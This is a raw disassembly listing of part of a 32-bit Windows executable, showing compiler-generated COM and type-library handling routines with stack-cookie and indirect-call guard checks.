  40270f:	call   DWORD PTR ds:0x4081a0
  402715:	call   esi
  402717:	mov    ecx,DWORD PTR [ebp-0x4]
  40271a:	xor    ecx,ebp
  40271c:	pop    esi
  40271d:	call   0x406340
  402722:	mov    esp,ebp
  402724:	pop    ebp
  402725:	ret    0x4
  402728:	int3   
  402729:	int3   
  40272a:	int3   
  40272b:	int3   
  40272c:	int3   
  40272d:	int3   
  40272e:	int3   
  40272f:	int3   
  402730:	mov    edi,edi
  402732:	push   ebp
  402733:	mov    ebp,esp
  402735:	push   ecx
  402736:	mov    eax,ds:0x407008
  40273b:	xor    eax,ebp
  40273d:	mov    DWORD PTR [ebp-0x4],eax
  402740:	mov    eax,DWORD PTR [ebp+0x8]
  402743:	push   esi
  402744:	mov    eax,DWORD PTR [eax+0x4]
  402747:	push   eax
  402748:	mov    ecx,DWORD PTR [eax]
  40274a:	mov    esi,DWORD PTR [ecx+0x8]
  40274d:	mov    ecx,esi
  40274f:	call   DWORD PTR ds:0x4081a0
  402755:	call   esi
  402757:	mov    ecx,DWORD PTR [ebp-0x4]
  40275a:	xor    ecx,ebp
  40275c:	pop    esi
  40275d:	call   0x406340
  402762:	mov    esp,ebp
  402764:	pop    ebp
  402765:	ret    0x4
  402768:	int3   
  402769:	int3   
  40276a:	int3   
  40276b:	int3   
  40276c:	int3   
  40276d:	int3   
  40276e:	int3   
  40276f:	int3   
  402770:	mov    edi,edi
  402772:	push   ebp
  402773:	mov    ebp,esp
  402775:	push   ecx
  402776:	mov    eax,ds:0x407008
  40277b:	xor    eax,ebp
  40277d:	mov    DWORD PTR [ebp-0x4],eax
  402780:	mov    eax,DWORD PTR [ebp+0x8]
  402783:	push   esi
  402784:	push   DWORD PTR [ebp+0x10]
  402787:	mov    eax,DWORD PTR [eax+0x4]
  40278a:	push   DWORD PTR [ebp+0xc]
  40278d:	push   eax
  40278e:	mov    ecx,DWORD PTR [eax]
  402790:	mov    esi,DWORD PTR [ecx]
  402792:	mov    ecx,esi
  402794:	call   DWORD PTR ds:0x4081a0
  40279a:	call   esi
  40279c:	mov    ecx,DWORD PTR [ebp-0x4]
  40279f:	xor    ecx,ebp
  4027a1:	pop    esi
  4027a2:	call   0x406340
  4027a7:	mov    esp,ebp
  4027a9:	pop    ebp
  4027aa:	ret    0xc
  4027ad:	int3   
  4027ae:	int3   
  4027af:	int3   
  4027b0:	int3   
  4027b1:	int3   
  4027b2:	int3   
  4027b3:	int3   
  4027b4:	int3   
  4027b5:	int3   
  4027b6:	int3   
  4027b7:	int3   
  4027b8:	int3   
  4027b9:	int3   
  4027ba:	int3   
  4027bb:	int3   
  4027bc:	int3   
  4027bd:	int3   
  4027be:	int3   
  4027bf:	int3   
  4027c0:	mov    edi,edi
  4027c2:	push   ebp
  4027c3:	mov    ebp,esp
  4027c5:	push   esi
  4027c6:	mov    esi,ecx
  4027c8:	call   0x40246f
  4027cd:	test   BYTE PTR [ebp+0x8],0x1
  4027d1:	je     0x4027da
  4027d3:	push   esi
  4027d4:	call   0x405f80
  4027d9:	pop    ecx
  4027da:	mov    eax,esi
  4027dc:	pop    esi
  4027dd:	pop    ebp
  4027de:	ret    0x4
  4027e1:	int3   
  4027e2:	int3   
  4027e3:	int3   
  4027e4:	int3   
  4027e5:	int3   
  4027e6:	int3   
  4027e7:	int3   
  4027e8:	int3   
  4027e9:	int3   
  4027ea:	int3   
  4027eb:	int3   
  4027ec:	int3   
  4027ed:	int3   
  4027ee:	int3   
  4027ef:	int3   
  4027f0:	mov    edi,edi
  4027f2:	push   ebp
  4027f3:	mov    ebp,esp
  4027f5:	push   esi
  4027f6:	mov    esi,ecx
  4027f8:	call   0x402591
  4027fd:	test   BYTE PTR [ebp+0x8],0x1
  402801:	je     0x40280a
  402803:	push   esi
  402804:	call   0x405f80
  402809:	pop    ecx
  40280a:	mov    eax,esi
  40280c:	pop    esi
  40280d:	pop    ebp
  40280e:	ret    0x4
  402811:	int3   
  402812:	int3   
  402813:	int3   
  402814:	int3   
  402815:	int3   
  402816:	int3   
  402817:	int3   
  402818:	int3   
  402819:	int3   
  40281a:	int3   
  40281b:	int3   
  40281c:	int3   
  40281d:	int3   
  40281e:	int3   
  40281f:	int3   
  402820:	mov    edi,edi
  402822:	push   ebp
  402823:	mov    ebp,esp
  402825:	push   ecx
  402826:	mov    eax,ds:0x407008
  40282b:	xor    eax,ebp
  40282d:	mov    DWORD PTR [ebp-0x4],eax
  402830:	mov    edx,DWORD PTR [ebp+0x14]
  402833:	mov    eax,0x80004003
  402838:	test   edx,edx
  40283a:	je     0x40286f
  40283c:	and    DWORD PTR [edx],0x0
  40283f:	cmp    DWORD PTR [ebp+0xc],0x0
  402843:	mov    ecx,DWORD PTR [ebp+0x10]
  402846:	je     0x402858
  402848:	call   0x4030a8
  40284d:	test   eax,eax
  40284f:	jne    0x402858
  402851:	mov    eax,0x80040110
  402856:	jmp    0x40286f
  402858:	mov    eax,DWORD PTR [ebp+0x8]
  40285b:	push   esi
  40285c:	push   edx
  40285d:	push   ecx
  40285e:	mov    esi,DWORD PTR [eax+0x24]
  402861:	mov    ecx,esi
  402863:	push   DWORD PTR [ebp+0xc]
  402866:	call   DWORD PTR ds:0x4081a0
  40286c:	call   esi
  40286e:	pop    esi
  40286f:	mov    ecx,DWORD PTR [ebp-0x4]
  402872:	xor    ecx,ebp
  402874:	call   0x406340
  402879:	mov    esp,ebp
  40287b:	pop    ebp
  40287c:	ret    0x10
  40287f:	int3   
  402880:	int3   
  402881:	int3   
  402882:	int3   
  402883:	int3   
  402884:	int3   
  402885:	int3   
  402886:	int3   
  402887:	int3   
  402888:	int3   
  402889:	int3   
  40288a:	int3   
  40288b:	int3   
  40288c:	int3   
  40288d:	int3   
  40288e:	int3   
  40288f:	int3   
  402890:	mov    edi,edi
  402892:	push   ebp
  402893:	mov    ebp,esp
  402895:	push   ecx
  402896:	mov    eax,ds:0x407008
  40289b:	xor    eax,ebp
  40289d:	mov    DWORD PTR [ebp-0x4],eax
  4028a0:	cmp    DWORD PTR [ebp+0xc],0x0
  4028a4:	push   esi
  4028a5:	push   edi
  4028a6:	mov    edi,DWORD PTR ds:0x407414
  4028ac:	mov    eax,DWORD PTR [edi]
  4028ae:	je     0x4028b5
  4028b0:	mov    esi,DWORD PTR [eax+0x4]
  4028b3:	jmp    0x4028b8
  4028b5:	mov    esi,DWORD PTR [eax+0x8]
  4028b8:	mov    ecx,esi
  4028ba:	call   DWORD PTR ds:0x4081a0
  4028c0:	mov    ecx,edi
  4028c2:	call   esi
  4028c4:	mov    ecx,DWORD PTR [ebp-0x4]
  4028c7:	xor    eax,eax
  4028c9:	pop    edi
  4028ca:	xor    ecx,ebp
  4028cc:	pop    esi
  4028cd:	call   0x406340
  4028d2:	mov    esp,ebp
  4028d4:	pop    ebp
  4028d5:	ret    0x8
  4028d8:	int3   
  4028d9:	int3   
  4028da:	int3   
  4028db:	int3   
  4028dc:	int3   
  4028dd:	push   0xc
  4028df:	push   0x406c88
  4028e4:	call   0x406b78
  4028e9:	xor    esi,esi
  4028eb:	mov    DWORD PTR [ebp-0x4],esi
  4028ee:	push   ecx
  4028ef:	call   DWORD PTR ds:0x408060
  4028f5:	jmp    0x402912
  4028f7:	mov    eax,DWORD PTR [ebp-0x14]
  4028fa:	mov    eax,DWORD PTR [eax]
  4028fc:	xor    ecx,ecx
  4028fe:	cmp    DWORD PTR [eax],0xc0000017
  402904:	sete   cl
  402907:	mov    eax,ecx
  402909:	ret    
  40290a:	mov    esp,DWORD PTR [ebp-0x18]
  40290d:	mov    esi,0x8007000e
  402912:	mov    DWORD PTR [ebp-0x1c],esi
  402915:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40291c:	mov    eax,esi
  40291e:	call   0x406bbd
  402923:	ret    
  402924:	int3   
  402925:	int3   
  402926:	int3   
  402927:	int3   
  402928:	int3   
  402929:	mov    edi,edi
  40292b:	push   ebp
  40292c:	mov    ebp,esp
  40292e:	sub    esp,0x10
  402931:	mov    eax,ds:0x407008
  402936:	xor    eax,ebp
  402938:	mov    DWORD PTR [ebp-0x4],eax
  40293b:	push   esi
  40293c:	push   edi
  40293d:	mov    edi,DWORD PTR ds:0x407040
  402943:	xor    eax,eax
  402945:	test   edi,edi
  402947:	je     0x402953
  402949:	mov    esi,DWORD PTR ds:0x407048
  40294f:	test   esi,esi
  402951:	jne    0x402967
  402953:	push   DWORD PTR [ebp+0x14]
  402956:	call   0x402ddc
  40295b:	mov    esi,DWORD PTR ds:0x407048
  402961:	mov    edi,DWORD PTR ds:0x407040
  402967:	test   edi,edi
  402969:	je     0x4029e5
  40296b:	push   ebx
  40296c:	test   esi,esi
  40296e:	je     0x4029cc
  402970:	cmp    DWORD PTR [ebp+0x10],0x1
  402974:	jne    0x4029cc
  402976:	mov    eax,DWORD PTR [ebp+0xc]
  402979:	mov    eax,DWORD PTR [eax]
  40297b:	mov    ecx,eax
  40297d:	mov    DWORD PTR [ebp-0xc],eax
  402980:	call   0x403320
  402985:	mov    ebx,DWORD PTR ds:0x40704c
  40298b:	mov    edx,eax
  40298d:	sub    ebx,0x1
  402990:	mov    DWORD PTR [ebp-0x10],edx
  402993:	js     0x4029cc
  402995:	imul   ecx,ebx,0xc
  402998:	add    ecx,0x4
  40299b:	add    ecx,esi
  40299d:	mov    DWORD PTR [ebp-0x8],ecx
  4029a0:	mov    eax,DWORD PTR [ecx]
  4029a2:	cmp    edx,eax
  4029a4:	jne    0x4029c1
  4029a6:	add    eax,eax
  4029a8:	push   eax
  4029a9:	push   DWORD PTR [ebp-0xc]
  4029ac:	push   DWORD PTR [ecx-0x4]
  4029af:	call   0x406c20
  4029b4:	add    esp,0xc
  4029b7:	test   eax,eax
  4029b9:	je     0x4029f7
  4029bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4029be:	mov    edx,DWORD PTR [ebp-0x10]
  4029c1:	sub    ecx,0xc
  4029c4:	sub    ebx,0x1
  4029c7:	mov    DWORD PTR [ebp-0x8],ecx
  4029ca:	jns    0x4029a0
  4029cc:	push   DWORD PTR [ebp+0x18]
  4029cf:	mov    esi,DWORD PTR [edi]
  4029d1:	push   DWORD PTR [ebp+0x10]
  4029d4:	push   DWORD PTR [ebp+0xc]
  4029d7:	mov    ecx,DWORD PTR [esi+0x28]
  4029da:	push   edi
  4029db:	call   DWORD PTR ds:0x4081a0
  4029e1:	call   DWORD PTR [esi+0x28]
  4029e4:	pop    ebx
  4029e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4029e8:	pop    edi
  4029e9:	xor    ecx,ebp
  4029eb:	pop    esi
  4029ec:	call   0x406340
  4029f1:	mov    esp,ebp
  4029f3:	pop    ebp
  4029f4:	ret    0x14
  4029f7:	imul   eax,ebx,0xc
  4029fa:	mov    ecx,DWORD PTR [eax+esi*1+0x8]
  4029fe:	mov    eax,DWORD PTR [ebp+0x18]
  402a01:	mov    DWORD PTR [eax],ecx
  402a03:	xor    eax,eax
  402a05:	jmp    0x4029e4
  402a07:	int3   
  402a08:	int3   
  402a09:	int3   
  402a0a:	int3   
  402a0b:	int3   
  402a0c:	mov    edi,edi
  402a0e:	push   ebp
  402a0f:	mov    ebp,esp
  402a11:	sub    esp,0xc
  402a14:	mov    eax,ds:0x407008
  402a19:	xor    eax,ebp
  402a1b:	mov    DWORD PTR [ebp-0x4],eax
  402a1e:	mov    eax,DWORD PTR [ecx]
  402a20:	push   edi
  402a21:	test   eax,eax
  402a23:	jne    0x402a2e
  402a25:	cmp    DWORD PTR [ebp+0x8],eax
  402a28:	jne    0x402aa4
  402a2a:	mov    al,0x1
  402a2c:	jmp    0x402aa6
  402a2e:	mov    edi,DWORD PTR [ebp+0x8]
  402a31:	test   edi,edi
  402a33:	je     0x402aa4
  402a35:	and    DWORD PTR [ebp-0x8],0x0
  402a39:	lea    ecx,[ebp-0x8]
  402a3c:	and    DWORD PTR [ebp-0xc],0x0
  402a40:	push   ebx
  402a41:	push   esi
  402a42:	mov    esi,DWORD PTR [eax]
  402a44:	mov    ebx,0x4014c4
  402a49:	push   ecx
  402a4a:	push   ebx
  402a4b:	push   eax
  402a4c:	mov    ecx,DWORD PTR [esi]
  402a4e:	call   DWORD PTR ds:0x4081a0
  402a54:	call   DWORD PTR [esi]
  402a56:	mov    esi,DWORD PTR [edi]
  402a58:	lea    eax,[ebp-0xc]
  402a5b:	push   eax
  402a5c:	push   ebx
  402a5d:	push   edi
  402a5e:	mov    ecx,DWORD PTR [esi]
  402a60:	call   DWORD PTR ds:0x4081a0
  402a66:	call   DWORD PTR [esi]
  402a68:	mov    ecx,DWORD PTR [ebp-0xc]
  402a6b:	mov    eax,DWORD PTR [ebp-0x8]
  402a6e:	cmp    eax,ecx
  402a70:	sete   bl
  402a73:	test   ecx,ecx
  402a75:	je     0x402a8a
  402a77:	mov    eax,DWORD PTR [ecx]
  402a79:	push   ecx
  402a7a:	mov    esi,DWORD PTR [eax+0x8]
  402a7d:	mov    ecx,esi
  402a7f:	call   DWORD PTR ds:0x4081a0
  402a85:	call   esi
  402a87:	mov    eax,DWORD PTR [ebp-0x8]
  402a8a:	test   eax,eax
  402a8c:	je     0x402a9e
  402a8e:	mov    ecx,DWORD PTR [eax]
  402a90:	push   eax
  402a91:	mov    esi,DWORD PTR [ecx+0x8]
  402a94:	mov    ecx,esi
  402a96:	call   DWORD PTR ds:0x4081a0
  402a9c:	call   esi
  402a9e:	pop    esi
  402a9f:	mov    al,bl
  402aa1:	pop    ebx
  402aa2:	jmp    0x402aa6
  402aa4:	xor    al,al
  402aa6:	mov    ecx,DWORD PTR [ebp-0x4]
  402aa9:	xor    ecx,ebp
  402aab:	pop    edi
  402aac:	call   0x406340
  402ab1:	mov    esp,ebp
  402ab3:	pop    ebp
  402ab4:	ret    0x4
  402ab7:	int3   
  402ab8:	int3   
  402ab9:	int3   
  402aba:	int3   
  402abb:	int3   
  402abc:	mov    edi,edi
  402abe:	push   ebp
  402abf:	mov    ebp,esp
  402ac1:	push   ecx
  402ac2:	mov    eax,ds:0x407008
  402ac7:	xor    eax,ebp
  402ac9:	mov    DWORD PTR [ebp-0x4],eax
  402acc:	push   esi
  402acd:	mov    esi,DWORD PTR [ebp+0x8]
  402ad0:	push   edi
  402ad1:	mov    edi,ecx
  402ad3:	push   DWORD PTR [esi]
  402ad5:	call   0x402a0c
  402ada:	test   al,al
  402adc:	jne    0x402b1c
  402ade:	mov    ecx,DWORD PTR [esi]
  402ae0:	test   edi,edi
  402ae2:	jne    0x402ae8
  402ae4:	xor    eax,eax
  402ae6:	jmp    0x402b1e
  402ae8:	push   ebx
  402ae9:	mov    ebx,DWORD PTR [edi]
  402aeb:	and    DWORD PTR [edi],0x0
  402aee:	test   ecx,ecx
  402af0:	je     0x402b07
  402af2:	mov    eax,DWORD PTR [ecx]
  402af4:	push   edi
  402af5:	push   0x401460
  402afa:	push   ecx
  402afb:	mov    esi,DWORD PTR [eax]
  402afd:	mov    ecx,esi
  402aff:	call   DWORD PTR ds:0x4081a0
  402b05:	call   esi
  402b07:	test   ebx,ebx
  402b09:	je     0x402b1b
  402b0b:	mov    eax,DWORD PTR [ebx]
  402b0d:	push   ebx
  402b0e:	mov    esi,DWORD PTR [eax+0x8]
  402b11:	mov    ecx,esi
  402b13:	call   DWORD PTR ds:0x4081a0
  402b19:	call   esi
  402b1b:	pop    ebx
  402b1c:	mov    eax,DWORD PTR [edi]
  402b1e:	mov    ecx,DWORD PTR [ebp-0x4]
  402b21:	pop    edi
  402b22:	xor    ecx,ebp
  402b24:	pop    esi
  402b25:	call   0x406340
  402b2a:	mov    esp,ebp
  402b2c:	pop    ebp
  402b2d:	ret    0x4
  402b30:	int3   
  402b31:	int3   
  402b32:	int3   
  402b33:	int3   
  402b34:	int3   
  402b35:	mov    edi,edi
  402b37:	push   ebp
  402b38:	mov    ebp,esp
  402b3a:	push   ecx
  402b3b:	push   ebx
  402b3c:	mov    ebx,DWORD PTR ds:0x407414
  402b42:	push   edi
  402b43:	xor    edi,edi
  402b45:	test   ebx,ebx
  402b47:	je     0x402b4e
  402b49:	add    ebx,0x4
  402b4c:	jmp    0x402b50
  402b4e:	mov    ebx,edi
  402b50:	test   ebx,ebx
  402b52:	jne    0x402b5b
  402b54:	mov    edi,0x80070057
  402b59:	jmp    0x402b9d
  402b5b:	push   0xc
  402b5d:	call   0x405fa4
  402b62:	mov    DWORD PTR [ebp-0x4],eax
  402b65:	pop    ecx
  402b66:	test   eax,eax
  402b68:	jne    0x402b71
  402b6a:	mov    edi,0x8007000e
  402b6f:	jmp    0x402b9d
  402b71:	push   esi
  402b72:	lea    esi,[ebx+0xc]
  402b75:	mov    DWORD PTR [eax],0x402bb0
  402b7b:	push   esi
  402b7c:	mov    DWORD PTR [eax+0x4],0x407034
  402b83:	call   DWORD PTR ds:0x408058
  402b89:	mov    eax,DWORD PTR [ebp-0x4]
  402b8c:	mov    ecx,DWORD PTR [ebx+0x8]
  402b8f:	push   esi
  402b90:	mov    DWORD PTR [eax+0x8],ecx
  402b93:	mov    DWORD PTR [ebx+0x8],eax
  402b96:	call   DWORD PTR ds:0x40805c
  402b9c:	pop    esi
  402b9d:	mov    eax,edi
  402b9f:	pop    edi
  402ba0:	pop    ebx
  402ba1:	mov    esp,ebp
  402ba3:	pop    ebp
  402ba4:	ret    0x8
  402ba7:	int3   
  402ba8:	int3   
  402ba9:	int3   
  402baa:	int3   
  402bab:	int3   
  402bac:	int3   
  402bad:	int3   
  402bae:	int3   
  402baf:	int3   
  402bb0:	mov    edi,edi
  402bb2:	push   ebp
  402bb3:	mov    ebp,esp
  402bb5:	push   ecx
  402bb6:	push   ecx
  402bb7:	mov    eax,ds:0x407008
  402bbc:	xor    eax,ebp
  402bbe:	mov    DWORD PTR [ebp-0x4],eax
  402bc1:	push   edi
  402bc2:	mov    edi,DWORD PTR [ebp+0x8]
  402bc5:	test   edi,edi
  402bc7:	je     0x402c1f
  402bc9:	mov    ecx,DWORD PTR [edi+0xc]
  402bcc:	push   esi
  402bcd:	test   ecx,ecx
  402bcf:	je     0x402be1
  402bd1:	mov    eax,DWORD PTR [ecx]
  402bd3:	push   ecx
  402bd4:	mov    esi,DWORD PTR [eax+0x8]
  402bd7:	mov    ecx,esi
  402bd9:	call   DWORD PTR ds:0x4081a0
  402bdf:	call   esi
  402be1:	and    DWORD PTR [edi+0xc],0x0
  402be5:	mov    eax,DWORD PTR [edi+0x14]
  402be8:	test   eax,eax
  402bea:	je     0x402c1a
  402bec:	lea    ecx,[eax-0x4]
  402bef:	push   ebx
  402bf0:	mov    ebx,DWORD PTR [ecx]
  402bf2:	imul   esi,ebx,0xc
  402bf5:	mov    DWORD PTR [ebp-0x8],ecx
  402bf8:	add    esi,eax
  402bfa:	sub    ebx,0x1
  402bfd:	js     0x402c12
  402bff:	lea    esi,[esi-0xc]
  402c02:	push   DWORD PTR [esi]
  402c04:	call   DWORD PTR ds:0x4080cc
  402c0a:	sub    ebx,0x1
  402c0d:	jns    0x402bff
  402c0f:	mov    ecx,DWORD PTR [ebp-0x8]
  402c12:	push   ecx
  402c13:	call   0x405f8a
  402c18:	pop    ecx
  402c19:	pop    ebx
  402c1a:	and    DWORD PTR [edi+0x14],0x0
  402c1e:	pop    esi
  402c1f:	mov    ecx,DWORD PTR [ebp-0x4]
  402c22:	xor    ecx,ebp
  402c24:	pop    edi
  402c25:	call   0x406340
  402c2a:	mov    esp,ebp
  402c2c:	pop    ebp
  402c2d:	ret    0x4
  402c30:	int3   
  402c31:	int3   
  402c32:	int3   
  402c33:	int3   
  402c34:	int3   
  402c35:	mov    edi,edi
  402c37:	push   ebp
  402c38:	mov    ebp,esp
  402c3a:	sub    esp,0x18
  402c3d:	mov    eax,ds:0x407008
  402c42:	xor    eax,ebp
  402c44:	mov    DWORD PTR [ebp-0x4],eax
  402c47:	push   ebx
  402c48:	push   esi
  402c49:	push   edi
  402c4a:	mov    edi,DWORD PTR [ebp+0x8]
  402c4d:	lea    ecx,[ebp-0x10]
  402c50:	push   ecx
  402c51:	push   edi
  402c52:	mov    eax,DWORD PTR [edi]
  402c54:	mov    esi,DWORD PTR [eax+0xc]
  402c57:	mov    ecx,esi
  402c59:	call   DWORD PTR ds:0x4081a0
  402c5f:	call   esi
  402c61:	test   eax,eax
  402c63:	js     0x402dc2
  402c69:	mov    eax,DWORD PTR [ebp-0x10]
  402c6c:	xor    ebx,ebx
  402c6e:	mov    ecx,ebx
  402c70:	push   0xc
  402c72:	mov    DWORD PTR [ebp-0xc],ecx
  402c75:	movzx  esi,WORD PTR [eax+0x2c]
  402c79:	mov    DWORD PTR ds:0x40704c,esi
  402c7f:	mov    DWORD PTR ds:0x407048,ebx
  402c85:	pop    edx
  402c86:	test   esi,esi
  402c88:	je     0x402cf7
  402c8a:	mov    eax,esi
  402c8c:	mul    edx
  402c8e:	seto   cl
  402c91:	neg    ecx
  402c93:	or     ecx,eax
  402c95:	xor    eax,eax
  402c97:	add    ecx,0x4
  402c9a:	setb   al
  402c9d:	neg    eax
  402c9f:	or     eax,ecx
  402ca1:	push   eax
  402ca2:	call   0x405f94
  402ca7:	pop    ecx
  402ca8:	test   eax,eax
  402caa:	je     0x402ccb
  402cac:	lea    ecx,[eax+0x4]
  402caf:	mov    DWORD PTR [eax],esi
  402cb1:	mov    DWORD PTR [ebp-0xc],ecx
  402cb4:	mov    eax,ecx
  402cb6:	jmp    0x402cc4
  402cb8:	mov    DWORD PTR [eax],ebx
  402cba:	lea    eax,[eax+0xc]
  402cbd:	or     DWORD PTR [eax-0x4],0xffffffff
  402cc1:	mov    DWORD PTR [eax-0x8],ebx
  402cc4:	sub    esi,0x1
  402cc7:	jns    0x402cb8
  402cc9:	jmp    0x402cd0
  402ccb:	mov    ecx,ebx
  402ccd:	mov    DWORD PTR [ebp-0xc],ebx
  402cd0:	test   ecx,ecx
  402cd2:	jne    0x402cf1
  402cd4:	mov    eax,DWORD PTR [edi]
  402cd6:	push   DWORD PTR [ebp-0x10]
  402cd9:	push   edi
  402cda:	mov    esi,DWORD PTR [eax+0x4c]
  402cdd:	mov    ecx,esi
  402cdf:	call   DWORD PTR ds:0x4081a0
  402ce5:	call   esi
  402ce7:	mov    eax,0x8007000e
  402cec:	jmp    0x402dc4
  402cf1:	mov    esi,DWORD PTR ds:0x40704c
  402cf7:	mov    eax,ebx
  402cf9:	mov    DWORD PTR [ebp-0x18],eax
  402cfc:	test   esi,esi
  402cfe:	jle    0x402da7
  402d04:	mov    ebx,ecx
  402d06:	and    DWORD PTR [ebx+0x4],0x0
  402d0a:	lea    ecx,[ebp-0x14]
  402d0d:	and    DWORD PTR [ebx+0x8],0x0
  402d11:	mov    esi,DWORD PTR [edi]
  402d13:	push   ecx
  402d14:	push   eax
  402d15:	push   edi
  402d16:	mov    ecx,DWORD PTR [esi+0x14]
  402d19:	call   DWORD PTR ds:0x4081a0
  402d1f:	call   DWORD PTR [esi+0x14]
  402d22:	test   eax,eax
  402d24:	js     0x402d91
  402d26:	mov    esi,DWORD PTR [edi]
  402d28:	xor    eax,eax
  402d2a:	push   eax
  402d2b:	push   eax
  402d2c:	push   eax
  402d2d:	mov    ecx,DWORD PTR [esi+0x30]
  402d30:	mov    DWORD PTR [ebp-0x8],eax
  402d33:	lea    eax,[ebp-0x8]
  402d36:	push   eax
  402d37:	mov    eax,DWORD PTR [ebp-0x14]
  402d3a:	push   DWORD PTR [eax]
  402d3c:	push   edi
  402d3d:	call   DWORD PTR ds:0x4081a0
  402d43:	call   DWORD PTR [esi+0x30]
  402d46:	test   eax,eax
  402d48:	js     0x402d74
  402d4a:	mov    esi,DWORD PTR [ebp-0x8]
  402d4d:	and    DWORD PTR [ebp-0x8],0x0
  402d51:	cmp    DWORD PTR [ebx],esi
  402d53:	je     0x402d5f
  402d55:	push   DWORD PTR [ebx]
  402d57:	call   DWORD PTR ds:0x4080cc
  402d5d:	mov    DWORD PTR [ebx],esi
  402d5f:	push   DWORD PTR [ebx]
  402d61:	call   DWORD PTR ds:0x4080b4
  402d67:	mov    ecx,DWORD PTR [ebp-0x14]
  402d6a:	mov    DWORD PTR [ebx+0x4],eax
  402d6d:	mov    eax,DWORD PTR [ecx]
  402d6f:	mov    DWORD PTR [ebx+0x8],eax
  402d72:	jmp    0x402d77
  402d74:	mov    ecx,DWORD PTR [ebp-0x14]
  402d77:	mov    eax,DWORD PTR [edi]
  402d79:	push   ecx
  402d7a:	push   edi
  402d7b:	mov    esi,DWORD PTR [eax+0x50]
  402d7e:	mov    ecx,esi
  402d80:	call   DWORD PTR ds:0x4081a0
  402d86:	call   esi
  402d88:	push   DWORD PTR [ebp-0x8]
  402d8b:	call   DWORD PTR ds:0x4080cc
  402d91:	mov    eax,DWORD PTR [ebp-0x18]
  402d94:	add    ebx,0xc
  402d97:	inc    eax
  402d98:	mov    DWORD PTR [ebp-0x18],eax
  402d9b:	cmp    eax,DWORD PTR ds:0x40704c
  402da1:	jl     0x402d06
  402da7:	mov    eax,DWORD PTR [ebp-0xc]
  402daa:	push   DWORD PTR [ebp-0x10]
  402dad:	mov    ds:0x407048,eax
  402db2:	mov    eax,DWORD PTR [edi]
  402db4:	push   edi
  402db5:	mov    esi,DWORD PTR [eax+0x4c]
  402db8:	mov    ecx,esi
  402dba:	call   DWORD PTR ds:0x4081a0
  402dc0:	call   esi
  402dc2:	xor    eax,eax
  402dc4:	mov    ecx,DWORD PTR [ebp-0x4]
  402dc7:	pop    edi
  402dc8:	pop    esi
  402dc9:	xor    ecx,ebp
  402dcb:	pop    ebx
  402dcc:	call   0x406340
  402dd1:	mov    esp,ebp
  402dd3:	pop    ebp
  402dd4:	ret    0x4
  402dd7:	int3   
  402dd8:	int3   
  402dd9:	int3   
  402dda:	int3   
  402ddb:	int3   
  402ddc:	mov    edi,edi
  402dde:	push   ebp
  402ddf:	mov    ebp,esp
  402de1:	sub    esp,0x21c
  402de7:	mov    eax,ds:0x407008
  402dec:	xor    eax,ebp
  402dee:	mov    DWORD PTR [ebp-0x4],eax
  402df1:	cmp    DWORD PTR ds:0x407040,0x0
  402df8:	je     0x402e0a
  402dfa:	cmp    DWORD PTR ds:0x407048,0x0
  402e01:	je     0x402e0a
  402e03:	xor    eax,eax
  402e05:	jmp    0x403011
  402e0a:	push   ebx
  402e0b:	mov    ebx,DWORD PTR ds:0x407414
  402e11:	push   esi
  402e12:	push   edi
  402e13:	add    ebx,0x10
  402e16:	push   ebx
  402e17:	call   DWORD PTR ds:0x408058
  402e1d:	mov    eax,ds:0x407040
  402e22:	mov    edi,0x80004005
  402e27:	test   eax,eax
  402e29:	jne    0x402fee
  402e2f:	and    DWORD PTR [ebp-0x218],eax
  402e35:	mov    ecx,0x407404
  402e3a:	mov    edx,DWORD PTR ds:0x407038
  402e40:	call   0x4030cc
  402e45:	mov    cx,WORD PTR ds:0x40703c
  402e4c:	test   eax,eax
  402e4e:	mov    ax,ds:0x40703e
  402e54:	je     0x402eb8
  402e56:	mov    esi,0xffff
  402e5b:	cmp    cx,si
  402e5e:	jne    0x402eb8
  402e60:	cmp    ax,si
  402e63:	jne    0x402eb8
  402e65:	mov    esi,0x104
  402e6a:	lea    eax,[ebp-0x20c]
  402e70:	push   esi
  402e71:	push   eax
  402e72:	push   DWORD PTR ds:0x40748c
  402e78:	call   DWORD PTR ds:0x40804c
  402e7e:	test   eax,eax
  402e80:	je     0x402fe7
  402e86:	cmp    eax,esi
  402e88:	je     0x402fe7
  402e8e:	and    DWORD PTR [ebp-0x210],0x0
  402e95:	lea    eax,[ebp-0x218]
  402e9b:	push   eax
  402e9c:	lea    eax,[ebp-0x20c]
  402ea2:	push   eax
  402ea3:	call   DWORD PTR ds:0x4080c4
  402ea9:	lea    ecx,[ebp-0x210]
  402eaf:	mov    edi,eax
  402eb1:	call   0x403968
  402eb6:	jmp    0x402ed3
  402eb8:	lea    esi,[ebp-0x218]
  402ebe:	movzx  eax,ax
  402ec1:	push   esi
  402ec2:	push   DWORD PTR [ebp+0x8]
  402ec5:	push   eax
  402ec6:	movzx  eax,cx
  402ec9:	push   eax
  402eca:	push   edx
  402ecb:	call   DWORD PTR ds:0x4080c8
  402ed1:	mov    edi,eax
  402ed3:	test   edi,edi
  402ed5:	js     0x402fe7
  402edb:	mov    eax,DWORD PTR [ebp-0x218]
  402ee1:	lea    ecx,[ebp-0x214]
  402ee7:	and    DWORD PTR [ebp-0x214],0x0
  402eee:	push   ecx
  402eef:	push   DWORD PTR ds:0x407034
  402ef5:	mov    esi,DWORD PTR [eax]
  402ef7:	push   eax
  402ef8:	mov    ecx,DWORD PTR [esi+0x18]
  402efb:	call   DWORD PTR ds:0x4081a0
  402f01:	call   DWORD PTR [esi+0x18]
  402f04:	mov    edi,eax
  402f06:	test   edi,edi
  402f08:	js     0x402fb7
  402f0e:	mov    eax,DWORD PTR [ebp-0x214]
  402f14:	mov    DWORD PTR [ebp-0x21c],eax
  402f1a:	test   eax,eax
  402f1c:	je     0x402f34
  402f1e:	mov    ecx,DWORD PTR [eax]
  402f20:	push   eax
  402f21:	mov    esi,DWORD PTR [ecx+0x4]
  402f24:	mov    ecx,esi
  402f26:	call   DWORD PTR ds:0x4081a0
  402f2c:	call   esi
  402f2e:	mov    eax,DWORD PTR [ebp-0x214]
  402f34:	and    DWORD PTR [ebp-0x210],0x0
  402f3b:	lea    ecx,[ebp-0x210]
  402f41:	mov    esi,DWORD PTR [eax]
  402f43:	push   ecx
  402f44:	push   0x401450
  402f49:	push   eax
  402f4a:	mov    ecx,DWORD PTR [esi]
  402f4c:	call   DWORD PTR ds:0x4081a0
  402f52:	call   DWORD PTR [esi]
  402f54:	test   eax,eax
  402f56:	js     0x402f6a
